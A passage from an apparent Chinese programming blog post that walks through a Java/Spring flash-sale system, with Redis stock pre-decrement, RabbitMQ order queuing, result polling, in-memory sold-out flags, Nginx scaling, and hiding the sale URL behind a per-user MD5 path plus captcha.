系统初始化</span><br><span class="hljs-comment">    * */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterPropertiesSet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        List&lt;GoodsVo&gt; goodsList = goodsService.listGoodsVo();<br>        <span class="hljs-keyword">if</span> (goodsList == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (GoodsVo goods : goodsList) &#123;<br>            redisService.set(GoodsKey.getMiaoshaGoodsStock,<span class="hljs-string">&quot;&quot;</span>+goods.getId(),goods.getStockCount());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><ol><li>收到请求，Redis预减库存，库存不足，直接返回，否则进入3（不符合条件的请求止步于redis，不会再访问mysql）</li><li>请求入队，立即返回排队中</li></ol><p>改写原来的miaosha()逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/do_miaosha&quot;,method = RequestMethod.POST)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;Integer&gt; <span class="hljs-title">miaosha</span><span class="hljs-params">(Model model, MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">                       <span class="hljs-meta">@RequestParam(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId)</span></span>&#123;<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.SESSION_ERROR);<br>        &#125;<br>        <span class="hljs-comment">//预减库存（先从redis减去库存）</span><br>        <span class="hljs-keyword">long</span> stock = redisService.decr(GoodsKey.getMiaoshaGoodsStock,<span class="hljs-string">&quot;&quot;</span>+goodsId);<br>        <span class="hljs-keyword">if</span> (stock &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.MIAO_SHA_OVER);<br>        &#125;<br>        <span class="hljs-comment">//判断是否已经秒杀到了</span><br>        MiaoshaOrder order = orderService.getMiaoshaOrderByUserIdAndGoodsId(user.getId(),goodsId);<br>        <span class="hljs-keyword">if</span> (order != <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.REPEATE_MIAOSHA);<br>        &#125;<br>        <span class="hljs-comment">//入队</span><br>        MiaoshaMessage mm = <span class="hljs-keyword">new</span> MiaoshaMessage();<br>        mm.setGoodsId(goodsId);<br>        mm.setUser(user);<br>        mqSender.sendMiaoshaMessage(mm);<br>        <span class="hljs-keyword">return</span> Result.success(<span class="hljs-number">0</span>);<span class="hljs-comment">//排队中</span><br><br>    &#125;<br></code></pre></td></tr></table></figure><p>编写发送信息MQ.sender.sendMiaoshaMessage()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MQSender</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Logger log = LoggerFactory.getLogger(MQSender.class);<br><br>    <span class="hljs-meta">@Autowired</span><br>    AmqpTemplate amqpTemplate ;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sendMiaoshaMessage</span><span class="hljs-params">(MiaoshaMessage mm)</span> </span>&#123;<br>        String msg = RedisService.beanToString(mm);<br>        log.info(<span class="hljs-string">&quot;send message:&quot;</span>+msg);<br>        amqpTemplate.convertAndSend(MQConfig.MIAOSHA_QUEUE, msg);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><ol><li>请求出队，生成订单，减少库存</li></ol><p>编写消息监听MQReceiver:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MQReceiver</span> </span>&#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Logger log = LoggerFactory.getLogger(MQReceiver.class);<br><br>    <span class="hljs-meta">@Autowired</span><br>    RedisService redisService;<br><br>    <span class="hljs-meta">@Autowired</span><br>    GoodsService goodsService;<br><br>    <span class="hljs-meta">@Autowired</span><br>    OrderService orderService;<br><br>    <span class="hljs-meta">@Autowired</span><br>    MiaoshaService miaoshaService;<br><br>    <span class="hljs-meta">@RabbitListener(queues=MQConfig.MIAOSHA_QUEUE)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">receive</span><span class="hljs-params">(String message)</span> </span>&#123;<br>        log.info(<span class="hljs-string">&quot;receive message:&quot;</span>+message);<br>        MiaoshaMessage mm  = RedisService.stringToBean(message, MiaoshaMessage.class);<br>        MiaoshaUser user = mm.getUser();<br>        <span class="hljs-keyword">long</span> goodsId = mm.getGoodsId();<br><br>        <span class="hljs-comment">//判断库存</span><br>        GoodsVo goods = goodsService.getGoodsVoByGoodsId(goodsId);<br>        <span class="hljs-keyword">int</span> stock = goods.getStockCount();<br>        <span class="hljs-keyword">if</span>(stock &lt;= <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">//判断是否已经秒杀到了</span><br>        MiaoshaOrder order = orderService.getMiaoshaOrderByUserIdAndGoodsId(user.getId(), goodsId);<br>        <span class="hljs-keyword">if</span>(order != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">//减库存 下订单 写入秒杀订单</span><br>        miaoshaService.miaosha(user, goods);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li>客户端轮询，是否秒杀成功</li></ol><p>在MiaoshaController编写miaoshaResult用于客户端轮询返回秒杀结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * orderId:成功</span><br><span class="hljs-comment">     * -1：秒杀失败</span><br><span class="hljs-comment">     * 0：排队中</span><br><span class="hljs-comment">    * */</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/result&quot;,method = RequestMethod.GET)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;Long&gt; <span class="hljs-title">miaoshaResult</span><span class="hljs-params">(Model model, MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">                                   <span class="hljs-meta">@RequestParam(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId)</span> </span>&#123;<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>, user);<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.SESSION_ERROR);<br>        &#125;<br>        <span class="hljs-keyword">long</span> result = miaoshaService.getMiaoshaResult(user.getId(),goodsId);<br>        <span class="hljs-keyword">return</span> Result.success(result);<br>    &#125;<br></code></pre></td></tr></table></figure><p>MiaoshaService</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//返回秒杀结果</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">long</span> <span class="hljs-title">getMiaoshaResult</span><span class="hljs-params">(Long userId, <span class="hljs-keyword">long</span> goodsId)</span> </span>&#123;<br>        MiaoshaOrder order = orderService.getMiaoshaOrderByUserIdAndGoodsId(userId, goodsId);<br>        <span class="hljs-comment">//秒杀成功</span><br>        <span class="hljs-keyword">if</span> (order != <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> order.getOrderId();<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">boolean</span> isOver = getGoodsOver(goodsId);<br>            <span class="hljs-keyword">if</span> (isOver)&#123;<br>                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">//存入库存状态信息</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setGoodsOver</span><span class="hljs-params">(Long goodsId)</span> </span>&#123;<br>        redisService.set(MiaoshaKey.isGoodsOver,<span class="hljs-string">&quot;&quot;</span>+goodsId,<span class="hljs-keyword">true</span>)<br><br><span class="hljs-comment">//返回库存状态信息</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">getGoodsOver</span><span class="hljs-params">(<span class="hljs-keyword">long</span> goodsId)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> redisService.exists(MiaoshaKey.isGoodsOver,<span class="hljs-string">&quot;&quot;</span>+goodsId);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="6-2-内存标记减少Redis访问"><a href="#6-2-内存标记减少Redis访问" class="headerlink" title="6.2 内存标记减少Redis访问"></a>6.2 内存标记减少Redis访问</h2><p>在MiaoshaController中预减库存需要访问redis。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//预减库存</span><br><span class="hljs-keyword">long</span> stock = redisService.decr(GoodsKey.getMiaoshaGoodsStock,<span class="hljs-string">&quot;&quot;</span>+goodsId);<br></code></pre></td></tr></table></figure><p>每个请求都要访问redis，虽然redis相比mysql快很多，但仍然有可以优化的空间。</p><p>建立</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Map&lt;Long,Boolean&gt; localOverMap = <span class="hljs-keyword">new</span> HashMap&lt;Long,Boolean&gt;();<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * 系统初始化</span><br><span class="hljs-comment">    * */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterPropertiesSet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        List&lt;GoodsVo&gt; goodsList = goodsService.listGoodsVo();<br>        <span class="hljs-keyword">if</span> (goodsList == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (GoodsVo goods : goodsList) &#123;<br>            redisService.set(GoodsKey.getMiaoshaGoodsStock,<span class="hljs-string">&quot;&quot;</span>+goods.getId(),goods.getStockCount());<br>            <span class="hljs-comment">//初始化库存时标记置为false</span><br>            localOverMap.put(goods.getId(),<span class="hljs-keyword">false</span>);<br>        &#125;<br>    &#125;<br><br><br><br> <span class="hljs-meta">@RequestMapping(value = &quot;/do_miaosha&quot;,method = RequestMethod.POST)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;Integer&gt; <span class="hljs-title">miaosha</span><span class="hljs-params">(Model model, MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">                       <span class="hljs-meta">@RequestParam(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId)</span></span>&#123;<br>        <span class="hljs-comment">//...</span><br><br>        <span class="hljs-comment">//内存标记，减少redis访问</span><br>        <span class="hljs-keyword">boolean</span> over = localOverMap.get(goodsId);<br>        <span class="hljs-keyword">if</span> (over)&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.MIAO_SHA_OVER);<br>        &#125;<br><br>        <span class="hljs-comment">//预减库存</span><br>        <span class="hljs-keyword">long</span> stock = redisService.decr(GoodsKey.getMiaoshaGoodsStock,<span class="hljs-string">&quot;&quot;</span>+goodsId);<br>        <span class="hljs-keyword">if</span> (stock &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-comment">//库存&lt;0标记置为true</span><br>            localOverMap.put(goodsId,<span class="hljs-keyword">true</span>);<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.MIAO_SHA_OVER);<br>        &#125;<br><span class="hljs-comment">//...</span><br><br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="6-3-Nginx水平扩展"><a href="#6-3-Nginx水平扩展" class="headerlink" title="6.3 Nginx水平扩展"></a>6.3 Nginx水平扩展</h2><p>​    nginx水平扩展是利用nginx的反向代理，一个域名配置多个解析ip，每次DNS解析请求来访问dns-server，会轮询返回这些ip。当nginx成为瓶颈的时候，只要增加服务器数量，新增nginx服务的部署，增加一个外网ip，就能扩展反向代理层的性能，做到理论上的无限高并发。</p><h1 id="7-安全优化"><a href="#7-安全优化" class="headerlink" title="7. 安全优化"></a>7. 安全优化</h1><h2 id="7-1-隐藏秒杀地址"><a href="#7-1-隐藏秒杀地址" class="headerlink" title="7.1 隐藏秒杀地址"></a>7.1 隐藏秒杀地址</h2><p>​        在秒杀开始之前，秒杀接口地址不要写到客户端，而是在秒杀开始之后，将秒杀地址动态地在客户端和服务器间进行交互完成拼接。这样一来，秒杀开始之前，秒杀地址对客户端不可见。</p><p><strong>实现思路：</strong></p><ul><li>秒杀开始之前，先去请求接口获取秒杀地址；</li><li>接口改造，带上<code>@pathVariable</code>参数；（MD5（UUID））</li><li>添加生成地址的接口；</li><li>秒杀收到请求，先验证<code>@pathVariable</code>参数。</li></ul><p><strong>注意：但是获取秒杀地址这个接口也有可能被恶意刷，可以使用验证码防刷。</strong></p><p>用户在提交获取秒杀地址的请求之前，需要将goodsId和verifyCode一同提交到服务端，服务器通过<code>@RequestParam</code>参数获取goodsId和verifyCode，然后检验验证码是否正确，如果正确，则返回秒杀地址给客户端，客户端得到秒杀地址后，拼接秒杀地址然后异步地向这个地址发出请求获取秒杀结果，这样就完成了秒杀接口地址的隐藏。</p><p>需要注意的是，这里需要将goodsId和verifyCode一同提交到服务端做校验，如果只提交goodsId，那么客户端仍然可以使用明文的方式获取随机生成的接口秒杀地址，但是，引入了verifyCode后，客户端需要将验证码也一起发送到服务端做验证，验证成功才返回随机生成的秒杀地址，不成功则返回非法请求，通过这样一种<strong>双重验证</strong>的方式，就可以方式用户使用不合理的手段参与秒杀，引入验证码有效地防止了这一点，因为验证码的输入需要用户真正参与进来。</p><ol><li><p>goods_detail.htm 商品详情页</p><p>​        修改“立即秒杀”按钮事件（秒杀时间到，才会显示立即秒杀按钮），先获取秒杀地址，再发起秒杀，后面还会加入校验图形验证码。</p><p>原来点击立即秒杀会执行miaosha()方法，现在修改为getMiaoshaPath():</p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-block&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;buyButton&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getMiaoshaPath()&quot;</span>&gt;</span>立即秒杀<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getMiaoshaPath</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> goodsId = $(<span class="hljs-string">&quot;#goodsId&quot;</span>).val();<br>        g_showLoading();<br>        $.ajax(&#123;<br>            url: <span class="hljs-string">&quot;/miaosha/path&quot;</span>,<br>            type: <span class="hljs-string">&quot;GET&quot;</span>,<br>            data: &#123;<br>                goodsId: $(<span class="hljs-string">&quot;#goodsId&quot;</span>).val(),<br>                verifyCode: $(<span class="hljs-string">&quot;#verifyCode&quot;</span>).val()<br>            &#125;,<br>            success: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) </span>&#123;<br>                <span class="hljs-keyword">if</span> (data.code == <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">var</span> path = data.data;<br>                    <span class="hljs-comment">//获取路径成功执行doMiaosha()</span><br>                    doMiaosha(path);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    layer.msg(data.msg);<br>                &#125;<br>            &#125;,<br>            error: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>                layer.msg(<span class="hljs-string">&quot;客户端请求有误&quot;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br></code></pre></td></tr></table></figure><p>获取到秒杀地址后，才往下执行真正的秒杀操作，并把path 拼接</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doMiaosha</span>(<span class="hljs-params">path</span>) </span>&#123;<br>        $.ajax(&#123;<br>            url: <span class="hljs-string">&quot;/miaosha/&quot;</span>+path+<span class="hljs-string">&quot;/do_miaosha&quot;</span>,<br>            type: <span class="hljs-string">&quot;POST&quot;</span>,<br>            data: &#123;<br>                goodsId: $(<span class="hljs-string">&quot;#goodsId&quot;</span>).val(),<br>            &#125;,<br>            success: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) </span>&#123;<br>                <span class="hljs-keyword">if</span> (data.code == <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-comment">// window.location.href=&quot;/order_detail.htm?orderId=&quot;+data.data.id;</span><br>                    getMiaoshaResult($(<span class="hljs-string">&quot;#goodsId&quot;</span>).val());<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    layer.msg(data.msg);<br>                &#125;<br>            &#125;,<br>            error: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>                layer.msg(<span class="hljs-string">&quot;客户端请求有误&quot;</span>);<br>            &#125;<br>        &#125;);<br><br>    &#125;<br></code></pre></td></tr></table></figure><ol><li>在后端新增获取秒杀接口地址</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">   * 获取秒杀接口地址</span><br><span class="hljs-comment">   * */</span><br>   <span class="hljs-meta">@RequestMapping()</span><br>   <span class="hljs-meta">@ResponseBody</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title">getMiaoshaPath</span><span class="hljs-params">(HttpServletRequest request,MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">            <span class="hljs-meta">@RequestParam(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId,</span></span><br><span class="hljs-function"><span class="hljs-params">            <span class="hljs-meta">@RequestParam(value = &quot;verifyCode&quot;,defaultValue = &quot;0&quot;)</span><span class="hljs-keyword">int</span> verifyCode</span></span><br><span class="hljs-function"><span class="hljs-params">           )</span></span>&#123;<br>       <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>)&#123;<br>           <span class="hljs-keyword">return</span> Result.error(CodeMsg.SESSION_ERROR);<br>       &#125;<br>       <span class="hljs-keyword">boolean</span> check = miaoshaService.checkVerifyCode(user,goodsId,verifyCode);<br>       <span class="hljs-keyword">if</span> (!check)&#123;<br>           <span class="hljs-keyword">return</span> Result.error(CodeMsg.REQUEST_ILLEGAL);<br>       &#125;<br>       String path = miaoshaService.createMiaoshaPath(user,goodsId);<br>       <span class="hljs-keyword">return</span> Result.success(path);<br>   &#125;<br></code></pre></td></tr></table></figure><p>createMiaoshaPath():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">createMiaoshaPath</span><span class="hljs-params">(MiaoshaUser user, <span class="hljs-keyword">long</span> goodsId)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span> || goodsId &lt;= <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        <span class="hljs-comment">//通过uuid生成并MD5加密，123456为固定盐值</span><br>        String str = MD5Util.md5(UUIDUtil.uuid()+<span class="hljs-string">&quot;123456&quot;</span>);<br>        <span class="hljs-comment">//key根据用户id和商品id 生成，所以每个用户获取到的秒杀地址不一样</span><br>        redisService.set(MiaoshaKey.getMiaoshaPath,<span class="hljs-string">&quot;&quot;</span>+user.getId()+<span class="hljs-string">&quot;_&quot;</span>+goodsId,str);<br>        <span class="hljs-keyword">return</span> str;<br>    &#125;<br></code></pre></td></tr></table></figure><p>得到秒杀地址进行请求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/&#123;path&#125;/do_miaosha&quot;,method = RequestMethod.POST)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;Integer&gt; <span class="hljs-title">miaosha</span><span class="hljs-params">(Model model, MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">                       <span class="hljs-meta">@RequestParam(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId,</span></span><br><span class="hljs-function"><span class="hljs-params">                       <span class="hljs-meta">@PathVariable(&quot;path&quot;)</span>String path)</span></span>&#123;<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.SESSION_ERROR);<br>        &#125;<br>        <span class="hljs-comment">//验证path</span><br>        <span class="hljs-keyword">boolean</span> check = miaoshaService.checkPath(user,goodsId,path);<br>        <span class="hljs-keyword">if</span> (!check)&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.REQUEST_ILLEGAL);<br>        &#125;<br>        <span class="hljs-comment">//...</span><br> &#125;<br></code></pre></td></tr></table></figure><p>checkPath():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">checkPath</span><span class="hljs-params">(MiaoshaUser user, <span class="hljs-keyword">long</span> goodsId, String path)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span> || path == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        String pathOld = redisService.get(MiaoshaKey.getMiaoshaPath,<span class="hljs-string">&quot;&quot;</span>+user.getId()+<span class="hljs-string">&quot;_&quot;</span>+goodsId,String.class);<br>        <span class="hljs-keyword">return</span> path.equals(pathOld);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="7-2-数学公式验证码"><a href="#7-2-数学公式验证码" class="headerlink" title="7.2 数学公式验证码"></a>7.2 